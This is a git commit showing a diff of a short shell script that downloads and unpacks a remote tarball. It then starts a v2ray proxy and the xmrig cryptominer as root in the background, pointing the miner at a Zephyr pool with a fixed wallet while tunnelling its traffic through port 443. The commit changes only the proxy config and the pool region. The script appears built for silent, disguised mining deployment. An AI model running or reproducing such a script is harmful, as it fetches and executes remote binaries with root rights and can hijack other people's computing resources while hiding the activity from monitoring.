92a05c0dc88e6107a31b03ac590e23c96de80eea
prendibs <94189491+prendibs@users.noreply.github.com>
2025-07-21 12:44:26 +0700

    Update eu.sh

--- eu.sh
+++ eu.sh
@@ -2,6 +2,6 @@
 #love u fika
 
 wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
-nohup sudo ./v2ray run --config=ap.json </dev/null >/dev/null 2>&1 &
+nohup sudo ./v2ray run --config=eu.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o sg.zephyr.herominers.com:1123 -u ZEPHsCjJrhRaXdWH3pXwJp3wbFaXQwUm1ZsNXua7eXo33vkQS9WfZ2tWvhtcAmFFE8JEqcZnCmJP4iNKBVa9bchNBhHPnh7Kp3g -p eu -a rx/0 -k --randomx-1gb-pages
+sudo ./xmrig -B -x 127.0.0.1:443 -o de.zephyr.herominers.com:1123 -u ZEPHsCjJrhRaXdWH3pXwJp3wbFaXQwUm1ZsNXua7eXo33vkQS9WfZ2tWvhtcAmFFE8JEqcZnCmJP4iNKBVa9bchNBhHPnh7Kp3g -p eu -a rx/0 -k --randomx-1gb-pages
